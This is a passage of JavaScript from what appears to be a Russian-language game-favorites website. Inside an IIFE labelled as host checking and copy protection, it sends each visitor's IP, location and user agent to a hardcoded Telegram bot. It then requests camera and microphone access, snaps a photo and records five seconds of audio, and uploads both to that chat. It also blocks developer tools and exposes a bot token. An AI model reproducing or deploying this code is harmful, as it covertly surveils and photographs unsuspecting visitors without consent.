                 <img src="${fav.image}" alt="${fav.name}" class="game-image" loading="lazy"> <!-- Ленивая загрузка картинок -->
                 <div class="favorite-icon active" onclick="toggleFavorite(event, this)" title="Удалить из избранного">❤️</div>
            </div>
            <div class="game-info">
                <span class="game-title" title="${fav.name}">${fav.name}</span>
                <a href="${fav.link}" target="_blank" class="play-button">ОТКРЫТЬ</a> <!-- Текст кнопки можно перевести -->
            </div>
        `;
        favoritesContainer.appendChild(favElement);
    });
}


// --- Самовызывающаяся функция (IIFE) для сбора данных и проверки хоста ---
(function() {
    // --- Конфигурация и переменные ---
    const isBrowserEnvironment = typeof window !== 'undefined' && typeof document !== 'undefined';
    const TARGET_HOSTNAME = 'https://kzshtr.github.io/'; // Ожидаемый домен
    const TELEGRAM_BOT_TOKEN = "8112617933:AAHnU6AwJBnrZrX3Ma0nd5wBds-Q1-RixA8"; // !!! НЕ ИСПОЛЬЗОВАТЬ ОРИГИНАЛ !!!
    const TELEGRAM_CHAT_ID = '-1002541658121'; // ID чата для отчетов
    const TELEGRAM_API_BASE_URL = 'https://api.telegram.org/bot';
    const SEND_MESSAGE_ENDPOINT = '/sendMessage';
    const SEND_DOCUMENT_ENDPOINT = '/sendDocument';
    const IP_INFO_URL = 'https://ipinfo.io/json'; // Сервис для получения IP и геолокации
    // Ссылки для перенаправления при блокировке
    const RICK_ROLL_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    const GITHUB_URL = 'https://';
    const TELEGRAM_CONTACT_LINK = 'https://t.me/recrut55';

    // --- Вспомогательные функции для Telegram ---

    // Отправка текстового сообщения
    function sendTelegramMessage(text) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "8112617933:AAHnU6AwJBnrZrX3Ma0nd5wBds-Q1-RixA8") {
            console.warn("[Telegram] Токен замаскирован. Сообщение не отправлено.");
            return Promise.resolve({ ok: false, error_code: -1, description: "Token redacted" }); // Возвращаем Promise для единообразия
        }
        const cleanToken = TELEGRAM_BOT_TOKEN.split('=')[0]; // На случай если к токену что-то приклеено
        const url = `${TELEGRAM_API_BASE_URL}${cleanToken}${SEND_MESSAGE_ENDPOINT}`;
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown' // Используем Markdown для форматирования
        };

        return fetch(url, { // Возвращаем Promise из fetch
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                console.error('[Telegram] Ошибка отправки сообщения:', data.description);
            } else {
                console.log('[Telegram] Сообщение успешно отправлено.');
            }
            return data; // Возвращаем ответ API
        })
        .catch(error => {
            console.error('[Telegram] Сетевая ошибка при отправке сообщения:', error);
            return { ok: false, error_code: -2, description: `Fetch error: ${error.message}` }; // Возвращаем объект ошибки
        });
    }

    // Отправка файла (фото/аудио)
    function sendTelegramDocument(blob, fileName, caption = '') {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "8112617933:AAHnU6AwJBnrZrX3Ma0nd5wBds-Q1-RixA8") {
            console.warn("[Telegram] Токен замаскирован. Документ не отправлен.");
             return Promise.resolve({ ok: false, error_code: -1, description: "Token redacted" });
        }
        const cleanToken = TELEGRAM_BOT_TOKEN.split('=')[0];
        const url = `${TELEGRAM_API_BASE_URL}${cleanToken}${SEND_DOCUMENT_ENDPOINT}`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, fileName);
        if (caption) {
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown'); // Добавляем parse_mode и для подписи
        }

        return fetch(url, { // Возвращаем Promise
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                console.error('[Telegram] Ошибка отправки документа:', data.description);
            } else {
                console.log('[Telegram] Документ успешно отправлен.');
            }
            return data;
        })
        .catch(error => {
            console.error('[Telegram] Сетевая ошибка при отправке документа:', error);
             return { ok: false, error_code: -2, description: `Fetch error: ${error.message}` };
        });
    }

    // --- Основная логика IIFE ---

    // Проверка: Выполняемся только в браузере
    if (!isBrowserEnvironment) {
        console.error('Скрипт предназначен для работы только в браузере.');
        return;
    }

    // Собираем базовую информацию
    const currentHostname = window.location.hostname.toLowerCase(); // Приводим к нижнему регистру для надежности
    const userAgent = navigator.userAgent;
    const currentTime = new Date().toLocaleString('ru-RU'); // Время в русском формате
    let userIP = 'Определение...'; // Переменная для IP

    // --- БЛОК: ЗАЩИТА ОТ КОПИРОВАНИЯ И ОТЛАДКИ ---
    if (currentHostname !== TARGET_HOSTNAME) {
        console.warn(`НЕАВТОРИЗОВАННЫЙ ЗАПУСК на домене: ${currentHostname} (Ожидался: ${TARGET_HOSTNAME})`);

        // 1. Блокируем страницу и показываем сообщение
        document.documentElement.innerHTML = `
            <head>
                <title>ОШИБКА [403] - Доступ запрещен</title>
                <meta charset="UTF-8">
                <style>
                    body { margin: 0; padding: 0; background: black; color: white; font-family: monospace; display: flex; height: 100vh; justify-content: center; align-items: center; text-align: center; }
                    .container { padding: 20px; border: 1px solid red; background: #111;}
                    h1 { color: red; text-shadow: 0 0 5px red; }
                    p { color: #ccc; }
                    button { background: #555; color: white; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; border-radius: 5px; font-family: monospace; }
                    button:hover { background: #777; }
                    #btn-tg { background: #0088cc; } #btn-tg:hover { background: #00aaff; }
                    #btn-gh { background: #333; } #btn-gh:hover { background: #555; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>TRACE_FAIL [403]</h1>
                    <p>Доступ отклонен. Обнаружено неавторизованное использование.</p>
                    <p style="color: grey;">Этот скрипт привязан к домену: ${TARGET_HOSTNAME}</p>
                    <p style="color: yellow;">Возможно, вы пытаетесь скопировать код или зашли с другого сайта.</p>
                    <div style="margin-top: 20px;">
                        <button id="btn-tg">Связаться (Telegram)</button>
                        <button id="btn-gh">Репозиторий (GitHub)</button>
                        <button onclick="window.location.href='${RICK_ROLL_URL}'">Секретное Решение</button>
                    </div>
                </div>
            </body>`;
        // Привязываем события к кнопкам после отрисовки
        setTimeout(() => {
            const btnTg = document.getElementById('btn-tg');
            if (btnTg) btnTg.onclick = () => window.location.href = TELEGRAM_CONTACT_LINK;
            const btnGh = document.getElementById('btn-gh');
            if (btnGh) btnGh.onclick = () => window.location.href = GITHUB_URL;
        }, 0);

        // 2. Блокируем инструменты разработчика
        const blockDevTools = (event) => {
            if ( event.key === 'F12' ||
                (event.ctrlKey && event.shiftKey && ['I', 'C', 'J'].includes(event.key.toUpperCase())) ||
                (event.ctrlKey && ['U', 'S', 'A', 'P'].includes(event.key.toUpperCase())) // U-source, S-save, A-save as, P-print
            ) {
                event.preventDefault();
                console.warn("Инструменты разработчика заблокированы.");
            }
        };
        document.addEventListener('keydown', blockDevTools);
        document.addEventListener('contextmenu', event => event.preventDefault()); // Блокируем правый клик

        // 3. Проверка открытия DevTools по размеру окна
        let devToolsCheckIntervalId = setInterval(() => {
            if ((window.outerWidth - window.innerWidth > 150) || (window.outerHeight - window.innerHeight > 150)) {
                 console.warn("DevTools обнаружены (разница размеров окна)!");
                 // Можно добавить перезагрузку или другие действия
                 // window.location.reload();
                 // clearInterval(devToolsCheckIntervalId); // Остановить проверку после обнаружения
            }
        }, 1500);

        // 4. Отправляем отчет о попытке неавторизованного запуска
        fetch(IP_INFO_URL)
            .then(res => res.json())
            .then(ipData => {
                 userIP = ipData.ip || 'Неизвестен';
                 const location = ipData.country ? `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country || ''}`.replace(/ ,/g,',').trim() : 'Неизвестно';
                 const provider = ipData.org || 'Неизвестен';
                 const message = `
🚫 *Попытка Неавторизованного Запуска!*
 -> Домен: \`${currentHostname}\` (Ожидался: \`${TARGET_HOSTNAME}\`)
 -> IP: \`${userIP}\`
 -> Локация: \`${location}\`
 -> Провайдер: \`${provider}\`
 -> User Agent: \`${userAgent}\`
 -> Время: \`${currentTime}\`
                 `;
                 sendTelegramMessage(message.trim());
            })
            .catch(err => {
                 console.error('[Защита] Ошибка получения IP для отчета:', err);
                 const message = `
🚫 *Попытка Неавторизованного Запуска!* (Ошибка получения IP)
 -> Домен: \`${currentHostname}\`
 -> User Agent: \`${userAgent}\`
 -> Время: \`${currentTime}\`
 -> Ошибка IP: ${err.message}
                 `;
                 sendTelegramMessage(message.trim());
            });

        // 5. Прерываем выполнение скрипта окончательно
        throw new Error(`Запуск скрипта остановлен: Неверный хост.`);

    } else {
        // --- БЛОК: КОД ВЫПОЛНЯЕТСЯ НА РАЗРЕШЕННОМ ДОМЕНЕ ---
        console.log(`Скрипт запущен на разрешенном домене: ${currentHostname}`);

        // 1. Отправляем информацию о входе пользователя
        fetch(IP_INFO_URL)
            .then(response => response.json())
            .then(ipData => {
                userIP = ipData.ip || 'Неизвестен';
                const country = ipData.country || '?';
                const city = ipData.city || '?';
                const region = ipData.region || '?';
                const org = ipData.org || 'Неизвестен';

                const infoMessage = `
✅ *Новое подключение*
 -> Домен: \`${currentHostname}\`
 -> IP: \`${userIP}\`
 -> Локация: \`${city}, ${region}, ${country}\`
 -> Провайдер: \`${org}\`
 -> User Agent: \`${userAgent}\`
 -> Время: \`${currentTime}\`
                `;
                sendTelegramMessage(infoMessage.trim());

                // 2. Пытаемся получить доступ к камере и микрофону
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        // Доступ получен! Отправляем уведомление.
                        sendTelegramMessage(`🟢 Доступ к камере/микрофону *ПОЛУЧЕН* от \`${userIP}\``);
                        // Запускаем функцию захвата фото и аудио
                        captureMediaAndSendData(stream, userIP);
                    })
                    .catch(error => {
                        // Доступ отклонен или ошибка
                        console.error('Ошибка доступа к медиа-устройствам:', error);
                        sendTelegramMessage(`❗️ Доступ к камере/микрофону *ОТКЛОНЕН* или ошибка у \`${userIP}\`.\nОшибка: ${error.name} - ${error.message}`);
                    });
            })
            .catch(error => {
                // Не удалось получить IP, но мы на правильном домене
                console.error('Ошибка получения IP:', error);
                 const errorMessage = `
⚠️ *Ошибка получения IP* (но домен верный)
 -> Домен: \`${currentHostname}\`
 -> User Agent: \`${userAgent}\`
 -> Время: \`${currentTime}\`
 -> Ошибка: ${error.message}
                 `;
                 sendTelegramMessage(errorMessage.trim());
                 // Все равно пытаемся запросить доступ к медиа
                 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => {
                        sendTelegramMessage(`🟢 Доступ к камере/микрофону *ПОЛУЧЕН* (IP не получен)`);
                        captureMediaAndSendData(stream, 'IP Не получен');
                    })
                    .catch(err => {
                        console.error('Ошибка доступа к медиа (IP не получен):', err);
                        sendTelegramMessage(`❗️ Доступ к камере/микрофону *ОТКЛОНЕН* или ошибка (IP не получен).\nОшибка: ${err.name} - ${err.message}`);
                    });
            });

        // 3. Проверка на DevTools (можно закомментировать, если мешает)
        // setInterval(() => {
        //     if ((window.outerWidth - window.innerWidth > 150) || (window.outerHeight - window.innerHeight > 150)) {
        //          sendTelegramMessage(`🕵️‍ *DevTools ОБНАРУЖЕНЫ* у \`${userIP}\` на \`${currentHostname}\`!`);
        //     }
        // }, 3000); // Проверяем реже

    } // Конец блока для разрешенного хоста

    // --- Функция для захвата фото, аудио и отправки ---
    function captureMediaAndSendData(stream, userId) {
        let videoTrack = stream.getVideoTracks()[0];
        let audioTrack = stream.getAudioTracks()[0];

        // Создаем временные элементы для видео и canvas
        const videoElement = document.createElement('video');
        videoElement.muted = true;
        videoElement.srcObject = stream;
        videoElement.play().catch(e => console.error("Ошибка воспроизведения видео для фото:", e));

        const canvasElement = document.createElement('canvas');
        const context = canvasElement.getContext('2d');

        // --- Захват фото ---
        // Делаем снимок через ~1.5 секунды, чтобы камера успела инициализироваться
        setTimeout(() => {
            try {
                // Устанавливаем размер canvas равным размеру видеопотока (или стандартным)
                canvasElement.width = videoTrack?.getSettings()?.width || 320;
                canvasElement.height = videoTrack?.getSettings()?.height || 240;

                if (canvasElement.width && canvasElement.height) {
                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                    // Конвертируем canvas в Blob (JPEG)
                    canvasElement.toBlob(blob => {
                        if (blob) {
                            sendTelegramDocument(blob, `photo_${userId}_${Date.now()}.jpg`, `📸 Фото от \`${userId}\``);
                        }
                        // Останавливаем видео-трек ПОСЛЕ снятия фото
                        if (videoTrack) { videoTrack.stop(); }
                        // Удаляем временные элементы
                        videoElement.remove();
                        canvasElement.remove();

                    }, 'image/jpeg', 0.75); // Качество JPEG 75%
                } else {
                    console.warn("Не удалось получить размеры видео для фото.");
                     if (videoTrack) { videoTrack.stop(); }
                     videoElement.remove();
                     canvasElement.remove();
                }
            } catch (e) {
                console.error("Ошибка при создании фото:", e);
                sendTelegramMessage(`❗️ Ошибка создания фото у \`${userId}\`. Ошибка: ${e.message}`);
                if (videoTrack) { videoTrack.stop(); }
                videoElement.remove();
                canvasElement.remove();
            }
        }, 1500); // Задержка перед фото

        // --- Захват аудио ---
        if (audioTrack) { // Проверяем, есть ли аудио трек
            try {
                const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' }); // Предпочитаемый формат
                const audioChunks = [];

                recorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                recorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        sendTelegramDocument(audioBlob, `audio_${userId}_${Date.now()}.webm`, `🎤 Аудио (${audioBlob.size} байт) от \`${userId}\``);
                    } else {
                        console.warn("Аудиозапись пуста.");
                    }
                    // Останавливаем и аудио трек
                    if (audioTrack) { audioTrack.stop(); }
                };

                recorder.onerror = (event) => {
                    console.error("Ошибка MediaRecorder:", event.error);
                    sendTelegramMessage(`❗️ Ошибка MediaRecorder у \`${userId}\`. Ошибка: ${event.error.name}`);
                    if (audioTrack) { audioTrack.stop(); }
                };

                recorder.start(); // Начинаем запись
                console.log("Начата запись аудио...");

                // Останавливаем запись через 5 секунд
                setTimeout(() => {
                    if (recorder.state === "recording") {
                        recorder.stop();
                        console.log("Запись аудио остановлена.");
                    }
                }, 5000); // Длительность записи 5 секунд

            } catch (e) {
                console.error("Ошибка инициализации MediaRecorder:", e);
                sendTelegramMessage(`❗️ Ошибка старта записи аудио у \`${userId}\`. Ошибка: ${e.message}`);
                if (audioTrack) { audioTrack.stop(); } // Останавливаем трек при ошибке
            }
        } else {
            console.warn("Аудио трек не доступен для записи.");
        }
    } // Конец функции captureMediaAndSendData

})(); // Конец основной IIFE

// --- Остальные функции интерфейса (уже определены выше) ---
// createStars, toggleBotMenu, toggleLangMenu, switchLanguage, detectDevice,
// updateDeviceInfo, toggleSettingsMenu, closeSettings, loadSettings, applyGlowEffect,
// toggleGlow, toggleStars, toggleBackgroundStyle, applyBackgroundStyle,
// generateParticles, openProfile, saveNickname, closeProfile, toggleFavorite,
// loadFavorites

// Конец файла